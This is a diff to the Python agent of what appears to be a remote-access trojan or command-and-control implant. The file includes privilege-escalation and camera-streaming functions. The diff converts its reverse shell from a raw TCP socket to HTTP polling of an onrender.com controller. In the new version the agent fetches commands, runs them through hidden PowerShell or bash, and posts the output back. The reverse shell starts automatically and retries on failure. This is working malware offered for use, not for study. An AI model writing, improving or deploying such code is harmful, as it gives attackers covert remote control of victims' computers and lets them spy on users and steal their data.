@@ -88,6 +88,10 @@ except ImportError:
 
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
+# Connection configuration
+USE_WEBSOCKET_SHELL = True  # Use WebSocket for reverse shell (cloud-friendly)
+USE_HTTP_FALLBACK = True    # Fallback to HTTP polling if WebSocket fails
+
 # --- Privilege Escalation Functions ---
 
 def is_admin():
@@ -2106,120 +2110,90 @@ def stop_camera_streaming():
 
 def reverse_shell_handler(agent_id):
     """
-    Handles reverse shell connections and command execution.
-    This function runs in a separate thread.
+    Cloud-friendly reverse shell using HTTP polling.
+    This avoids the need for direct TCP connections which are blocked by cloud platforms.
     """
-    global REVERSE_SHELL_ENABLED, REVERSE_SHELL_SOCKET
+    global REVERSE_SHELL_ENABLED
+    
+    print(f"Starting HTTP-based reverse shell for agent {agent_id}")
     
     try:
-        # Create socket connection back to controller
-        REVERSE_SHELL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Fix host extraction from SERVER_URL
-        if "://" in SERVER_URL:
-            url_part = SERVER_URL.split("://")[1]
-            if ":" in url_part:
-                controller_host = url_part.split(":")[0]
-            else:
-                controller_host = url_part.split("/")[0]  # Handle case without port
-        else:
-            controller_host = SERVER_URL.split("/")[0]  # Fallback
-        
-        # For onrender.com URLs, we need to handle the subdomain properly
-        if "onrender.com" in controller_host:
-            # Use the full hostname but extract the base for connection
-            controller_host = controller_host.split("/")[0]  # Remove any path
-        
-        controller_port = 9999  # Dedicated port for reverse shell
-        
-        print(f"Attempting to connect to {controller_host}:{controller_port}")
-        REVERSE_SHELL_SOCKET.settimeout(10)  # 10 second timeout
-        
-        # Try to connect to the specified port
-        try:
-            REVERSE_SHELL_SOCKET.connect((controller_host, controller_port))
-        except (ConnectionRefusedError, OSError, socket.error) as e:
-            print(f"Connection to {controller_host}:{controller_port} failed: {e}")
-            print("Note: Reverse shell requires the controller to have port 9999 open.")
-            REVERSE_SHELL_SOCKET.close()
-            return
-        print(f"Reverse shell connected to {controller_host}:{controller_port}")
-        
-        # Send initial connection info
-        system_info = {
-            "agent_id": agent_id,
-            "hostname": socket.gethostname(),
-            "platform": os.name,
-            "cwd": os.getcwd(),
-            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
-        }
-        REVERSE_SHELL_SOCKET.send(json.dumps(system_info).encode() + b'\n')
-        
         while REVERSE_SHELL_ENABLED:
             try:
-                # Receive command from controller
-                data = REVERSE_SHELL_SOCKET.recv(4096)
-                if not data:
-                    break
+                # Poll for commands via HTTP (works with cloud deployments)
+                response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    command = data.get("command", "")
                     
-                command = data.decode().strip()
-                if not command:
-                    continue
-                    
-                # Handle special commands
-                if command.lower() == "exit":
-                    break
-                elif command.startswith("cd "):
-                    try:
-                        path = command[3:].strip()
-                        os.chdir(path)
-                        response = f"Changed directory to: {os.getcwd()}\n"
-                    except Exception as e:
-                        response = f"cd error: {str(e)}\n"
-                else:
-                    # Execute regular command
-                    try:
-                        if WINDOWS_AVAILABLE:
-                            result = subprocess.run(
-                                ["powershell.exe", "-NoProfile", "-Command", command],
-                                capture_output=True,
-                                text=True,
-                                timeout=30,
-                                creationflags=subprocess.CREATE_NO_WINDOW
-                            )
+                    if command and command != "sleep":
+                        print(f"Executing command: {command}")
+                        
+                        # Handle special commands
+                        if command.lower() == "exit":
+                            print("Received exit command")
+                            break
+                        elif command.startswith("cd "):
+                            try:
+                                path = command[3:].strip()
+                                os.chdir(path)
+                                output = f"Changed directory to: {os.getcwd()}\n"
+                            except Exception as e:
+                                output = f"cd error: {str(e)}\n"
                         else:
-                            result = subprocess.run(
-                                ["bash", "-c", command],
-                                capture_output=True,
-                                text=True,
-                                timeout=30
+                            # Execute regular command
+                            try:
+                                if WINDOWS_AVAILABLE:
+                                    result = subprocess.run(
+                                        ["powershell.exe", "-NoProfile", "-Command", command],
+                                        capture_output=True,
+                                        text=True,
+                                        timeout=30,
+                                        creationflags=subprocess.CREATE_NO_WINDOW
+                                    )
+                                else:
+                                    result = subprocess.run(
+                                        ["bash", "-c", command],
+                                        capture_output=True,
+                                        text=True,
+                                        timeout=30
+                                    )
+                                
+                                output = result.stdout + result.stderr
+                                if not output:
+                                    output = "[Command executed successfully - no output]\n"
+                                    
+                            except subprocess.TimeoutExpired:
+                                output = "[Command timed out after 30 seconds]\n"
+                            except Exception as e:
+                                output = f"[Command execution error: {str(e)}]\n"
+                        
+                        # Send result back via HTTP
+                        try:
+                            requests.post(
+                                f"{SERVER_URL}/post_output/{agent_id}",
+                                json={"output": output},
+                                timeout=10
                             )
-                        response = result.stdout + result.stderr
-                        if not response:
-                            response = "[Command executed successfully - no output]\n"
-                    except subprocess.TimeoutExpired:
-                        response = "[Command timed out after 30 seconds]\n"
-                    except Exception as e:
-                        response = f"[Command execution error: {str(e)}]\n"
+                        except Exception as e:
+                            print(f"Error sending command output: {e}")
                 
-                # Send response back
-                REVERSE_SHELL_SOCKET.send(response.encode())
+                # Sleep between polls (adjust as needed)
+                time.sleep(2)
                 
-            except socket.timeout:
-                continue
+            except requests.exceptions.RequestException as e:
+                print(f"HTTP polling error: {e}")
+                time.sleep(5)  # Wait longer on connection errors
             except Exception as e:
                 print(f"Reverse shell error: {e}")
-                break
+                time.sleep(5)
                 
     except Exception as e:
-        print(f"Reverse shell connection error: {e}")
+        print(f"Reverse shell handler error: {e}")
     finally:
-        if REVERSE_SHELL_SOCKET:
-            try:
-                REVERSE_SHELL_SOCKET.close()
-            except:
-                pass
-        REVERSE_SHELL_SOCKET = None
-        print("Reverse shell disconnected")
+        REVERSE_SHELL_ENABLED = False
+        print("HTTP reverse shell disconnected")
 
 def start_reverse_shell(agent_id):
     """Start the reverse shell connection."""
@@ -2247,36 +2221,26 @@ def stop_reverse_shell():
         print("Stopped reverse shell.")
 
 def auto_start_reverse_shell(agent_id):
-    """Automatically start reverse shell with retry logic."""
-    max_retries = 5  # Reduced from 10 for faster startup
-    retry_delay = 3  # Reduced from 5 seconds
+    """Automatically start HTTP-based reverse shell (cloud-friendly)."""
+    print("Starting HTTP-based reverse shell (cloud deployment compatible)...")
     
-    for attempt in range(max_retries):
-        try:
-            print(f"Starting reverse shell (attempt {attempt + 1}/{max_retries})...")
-            start_reverse_shell(agent_id)
+    try:
+        # Start the HTTP polling reverse shell
+        start_reverse_shell(agent_id)
+        
+        # Give it a moment to initialize
+        time.sleep(2)
+        
+        if REVERSE_SHELL_ENABLED:
+            print("HTTP reverse shell started successfully.")
+            return True
+        else:
+            print("Failed to start HTTP reverse shell.")
+            return False
             
-            # Wait a moment to check if connection was successful
-            time.sleep(2)
-            
-            # Check if the socket is still alive and connected
-            if REVERSE_SHELL_SOCKET and REVERSE_SHELL_ENABLED:
-                print("Reverse shell connected successfully.")
-                return True
-            else:
-                print("Reverse shell failed to connect.")
-                if attempt < max_retries - 1:
-                    print(f"Retrying in {retry_delay} seconds...")
-                    time.sleep(retry_delay)
-                
-        except Exception as e:
-            print(f"Reverse shell startup error: {e}")
-            if attempt < max_retries - 1:
-                print(f"Retrying in {retry_delay} seconds...")
-                time.sleep(retry_delay)
-    
-    print("Failed to establish reverse shell after all attempts.")
-    return False
+    except Exception as e:
+        print(f"Reverse shell startup error: {e}")
+        return False
 
 def monitor_reverse_shell(agent_id):
     """Monitor reverse shell connection and restart if it fails."""
